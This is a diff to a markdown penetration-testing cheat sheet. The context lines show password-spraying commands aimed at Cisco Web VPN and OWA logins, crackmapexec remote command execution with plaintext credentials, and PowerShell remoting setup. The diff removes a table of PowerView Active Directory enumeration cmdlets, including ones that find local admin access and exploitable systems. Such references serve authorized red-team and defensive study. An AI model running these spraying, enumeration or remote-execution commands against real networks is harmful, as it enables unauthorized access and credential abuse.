@@ -80,28 +80,6 @@
 |spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
 |./atomizer.py owa contoso.com 'Fall2018' emails.txt|
 
-
-### Active Directory Enumeration 
-
-|Active Directory Enumeration | for Example |
-| ------------- | ------------- |
-| [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | current domain info|
-| ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() | domain trusts|
-| [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() | current forest info|
-| Get-NetDomain | gets the name of the current user's domain|
-| Get-NetForest | gets the forest associated with the current user's domain|
-| Get-NetForestDomain | gets all domains for the current forest|
-| Get-NetDomainController | gets the domain controllers for the current computer's domain|
-| Get-NetComputer | gets a list of all current servers in the domain|
-| Get-NetDomainTrust  | gets all trusts for the current user's domain|
-| Get-NetForestTrust |  gets all trusts for the forest associated with the current user's domain|
-| Find-LocalAdminAccess | finds machines on the domain that the current user has local admin access to|
-| Get-ExploitableSystem |  finds systems likely vulnerable to common exploits|
-| Get-ObjectAcl | returns the ACLs associated with a specific active directory object|
-| Get-DomainSID | return the SID for the specified domain|
-| Get-NetFileServer | get a list of file servers used by current domain users|
-
-
 ### Commands Execute Remotely using Both Plaintext and NTLM
 
 
@@ -121,7 +99,7 @@
 |crackmapexec 192.168.1.1 -u Administrator -p '1234567qA' -x whoami|
 
 | PowerShell Remoting |
-| ------------- |
+| ------------------- |
 |$Username = 'ninja.corp\MeMe' #powershell variable |
 |$Password = '123456789aA'|
 |$pass= ConvertTo-SecureString -AsPlainText $Password -Force #powershell variable |
